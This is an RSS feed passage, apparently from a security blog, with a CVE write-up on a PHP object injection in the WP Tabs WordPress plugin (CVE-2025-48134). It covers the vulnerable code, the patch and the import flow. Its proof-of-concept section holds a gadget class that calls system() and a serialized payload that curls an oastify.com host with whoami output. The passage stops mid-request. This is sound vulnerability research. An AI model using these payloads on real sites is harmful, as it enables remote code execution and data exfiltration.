aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-1-1-unauthenticated-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin &amp;lt;= 3.1.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48134 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-24-cve-2025-48134/</link>
      <pubDate>Mon, 24 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-24-cve-2025-48134/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; vulnerability in ShapedPlugin LLC WP Tabs allows &lt;strong&gt;Object Injection&lt;/strong&gt;. This issue affects WP Tabs from unspecified versions up to version 2.2.12.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-48134&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48134&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.2.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-expand-tabs-free/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Tabs Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Tabs&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.12&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.2.13&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v2.2.12):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; function is called directly on user data (&lt;code&gt;$value&lt;/code&gt; after replacing &lt;code&gt;&#39;{#ID#}&#39;&lt;/code&gt; with &lt;code&gt;$new_tabs_id&lt;/code&gt;). This creates a critical vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker injects a PHP object payload into base64 data, decoding and unserialization will instantiate the malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lack of safety checks&lt;/strong&gt;: No validation is performed before unserializing.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If the data is invalid or corrupted, the system has no alternative handling, making the application exploitable.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v2.2.13):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#39; alt=&#34;Diff&#34; height=&#34;320&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch uses &lt;code&gt;unserialize&lt;/code&gt; with &lt;code&gt;&#39;allowed_classes&#39; =&amp;gt; false&lt;/code&gt;, completely removing the ability to instantiate objects and fully mitigating the vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX endpoint for logged-in users (&lt;code&gt;wp_ajax_&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;loader-&amp;gt;add_action( &amp;#39;wp_ajax_tabs_import_shortcode&amp;#39;, $import_export, &amp;#39;import_shortcode&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=tabs_import_shortcode&lt;/code&gt; calls the &lt;code&gt;import_shortcode&lt;/code&gt; callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function import_shortcode() {&#xA;    $nonce = ( ! empty( $_POST[&amp;#39;nonce&amp;#39;] ) ) ? sanitize_text_field( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ) : &amp;#39;&amp;#39;;&#xA;    if ( ! wp_verify_nonce( $nonce, &amp;#39;wptabspro_options_nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( array( &amp;#39;message&amp;#39; =&amp;gt; esc_html__( &amp;#39;Error: Nonce verification has failed. Please try again.&amp;#39;, &amp;#39;wp-expand-tabs-free&amp;#39; ) ), 401 );&#xA;    }&#xA;    $allow_tags = isset( $_POST[&amp;#39;unSanitize&amp;#39;] ) ? sanitize_text_field( wp_unslash( $_POST[&amp;#39;unSanitize&amp;#39;] ) ) : &amp;#39;&amp;#39;;&#xA;    // Don&amp;#39;t worry sanitize after JSON decode below.&#xA;    $data         = isset( $_POST[&amp;#39;shortcode&amp;#39;] ) ? wp_unslash( $_POST[&amp;#39;shortcode&amp;#39;] ) : &amp;#39;&amp;#39;;//phpcs:ignore&#xA;    $data       = json_decode( $data );&#xA;    $data       = json_decode( $data, true );&#xA;    $shortcodes = $allow_tags ? $data[&amp;#39;shortcode&amp;#39;] : wp_kses_post_deep( $data[&amp;#39;shortcode&amp;#39;] );&#xA;    if ( ! $data ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Nothing to import.&amp;#39;, &amp;#39;wp-expand-tabs-free&amp;#39; ),&#xA;            ),&#xA;            400&#xA;        );&#xA;    }&#xA;&#xA;    $status = $this-&amp;gt;import( $shortcodes );&#xA;&#xA;    if ( is_wp_error( thing: $status ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; $status-&amp;gt;get_error_message(),&#xA;            ),&#xA;            400&#xA;        );&#xA;    }&#xA;&#xA;    wp_send_json_success( $status, 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks the nonce; if invalid, it returns an error and stops execution.&lt;/p&gt;&#xA;&lt;p&gt;Testing the plugin, the &lt;strong&gt;import&lt;/strong&gt; feature is found at &lt;code&gt;/wp-admin/edit.php?post_type=sp_wp_tabs&amp;amp;page=tab_tools#tab=2&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#34; title=&#34;Import feature&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/search1.png&#34; data-sub-html=&#34;&lt;h2&gt;Import feature&lt;/h2&gt;&lt;p&gt;Import feature&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#39; alt=&#34;Import feature&#34; height=&#34;519&#34; width=&#34;1238&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Import feature&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This feature is restricted to Administrators, so a valid nonce must belong to an Administrator.&lt;/p&gt;&#xA;&lt;p&gt;The uploaded JSON file is assigned to the &lt;code&gt;shortcode&lt;/code&gt; parameter in the POST request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data       = isset( $_POST[&amp;#39;shortcode&amp;#39;] ) ? wp_unslash( $_POST[&amp;#39;shortcode&amp;#39;] ) : &amp;#39;&amp;#39;;//phpcs:ignore&#xA;$data       = json_decode( $data );&#xA;$data       = json_decode( $data, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The plugin decodes JSON twice. In the second call, &lt;code&gt;associative=true&lt;/code&gt; converts JSON objects into PHP arrays as described:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;@param $associative: When true, JSON objects will be returned as associative arrays; when false, JSON objects will be returned as objects. When null, JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Then &lt;code&gt;import( $shortcodes )&lt;/code&gt; is called with &lt;code&gt;$shortcodes&lt;/code&gt; as &lt;code&gt;$data[&#39;shortcode&#39;]&lt;/code&gt;. Current JSON upload structure:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function import( $shortcodes ) {&#xA;    $errors = array();&#xA;    foreach ( $shortcodes as $index =&amp;gt; $shortcode ) {&#xA;        $errors[ $index ] = array();&#xA;        $new_tabs_id      = 0;&#xA;        try {&#xA;            ...&#xA;            if ( isset( $shortcode[&amp;#39;meta&amp;#39;] ) &amp;amp;&amp;amp; is_array( $shortcode[&amp;#39;meta&amp;#39;] ) ) {&#xA;                foreach ( $shortcode[&amp;#39;meta&amp;#39;] as $key =&amp;gt; $value ) {&#xA;                    if ( &amp;#39;sp_tab_source_options&amp;#39; === $key || &amp;#39;sp_tab_shortcode_options&amp;#39; === $key ) {&#xA;                        $sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&#xA;&#xA;                        update_post_meta(&#xA;                            $new_tabs_id,&#xA;                            $key,&#xA;                            $sanitize_value&#xA;                        );&#xA;&#xA;                    }&#xA;                }&#xA;            }&#xA;        } catch ( Exception $e ) {&#xA;            array_push( $errors[ $index ], $e-&amp;gt;getMessage() );&#xA;            // If there was a failure somewhere, clean up.&#xA;            wp_trash_post( $new_tabs_id );&#xA;        }&#xA;        ...&#xA;    }&#xA;&#xA;    $errors = reset( $errors );&#xA;    return isset( $errors[0] ) ? new WP_Error( &amp;#39;import_tabs_error&amp;#39;, $errors[0] ) : $shortcodes;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function loops through shortcodes and checks if &lt;code&gt;shortcode[&#39;meta&#39;]&lt;/code&gt; exists as an array; if so, it iterates over &lt;code&gt;$shortcode[&#39;meta&#39;]&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$sanitize_value = $this-&amp;gt;sanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( &amp;#39;{#ID#}&amp;#39;, $new_tabs_id, $value ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the key is &lt;code&gt;sp_tab_source_options&lt;/code&gt; or &lt;code&gt;sp_tab_shortcode_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Replace &lt;code&gt;{#ID#}&lt;/code&gt; in the value with &lt;code&gt;$new_tabs_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;maybe_unserialize()&lt;/code&gt; to decode serialized data&lt;/li&gt;&#xA;&lt;li&gt;Call &lt;code&gt;sanitize_and_collect_metabox_data()&lt;/code&gt; to sanitize and normalize data&lt;/li&gt;&#xA;&lt;li&gt;Finally, store the sanitized value using &lt;code&gt;update_post_meta()&lt;/code&gt; for post ID &lt;code&gt;$new_tabs_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Thus, the JSON structure to upload is:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;    &amp;#34;shortcode1&amp;#34;: {&#xA;      &amp;#34;meta&amp;#34;: {&#xA;        &amp;#34;sp_tab_source_options&amp;#34;: &amp;#34;serialized_payload&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode&amp;#34;] --&amp;gt; B[&amp;#34;import_shortcode() invoked&amp;#34;]&#xA;&#xA;B --&amp;gt; C{&amp;#34;Check nonce: wp_verify_nonce()&amp;#34;}&#xA;C --&amp;gt;|Fail| X[&amp;#34;Stop &amp;amp; return error: Nonce verification failed&amp;#34;]&#xA;C --&amp;gt;|Pass| D[&amp;#34;json_decode() twice → extract $shortcodes&amp;#34;]&#xA;&#xA;D --&amp;gt;|Empty/Invalid| Y[&amp;#34;Stop &amp;amp; return error: Nothing to import&amp;#34;]&#xA;D --&amp;gt;|Valid| E[&amp;#34;Call import($shortcodes)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Loop through each shortcode&amp;#34;]&#xA;F --&amp;gt; H{&amp;#34;Has &amp;#39;meta&amp;#39; and is array?&amp;#34;}&#xA;H --&amp;gt;|No| Z[&amp;#34;Skip entry&amp;#34;]&#xA;H --&amp;gt;|Yes| I[&amp;#34;Loop each meta field&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;Key == &amp;#39;sp_tab_source_options&amp;#39; OR &amp;#39;sp_tab_shortcode_options&amp;#39;?&amp;#34;}&#xA;J --&amp;gt;|No| Z&#xA;J --&amp;gt;|Yes| K[&amp;#34;Replace {#ID#} with new ID&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;maybe_unserialize() ← Vulnerable&amp;#34;]&#xA;&#xA;L --&amp;gt; M{&amp;#34;Does unserialize create object?&amp;#34;}&#xA;M --&amp;gt;|Yes| R[&amp;#34;Object Injection → Possible RCE if malicious class exists&amp;#34;]&#xA;M --&amp;gt;|No| S[&amp;#34;Sanitize &amp;#43; update_post_meta() and continue&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Import JSON file:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;shortcode&amp;#34;: {&#xA;    &amp;#34;shortcode1&amp;#34;: {&#xA;      &amp;#34;meta&amp;#34;: {&#xA;        &amp;#34;sp_tab_source_options&amp;#34;: &amp;#34;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:75:\&amp;#34;curl http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)\&amp;#34;;}&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: 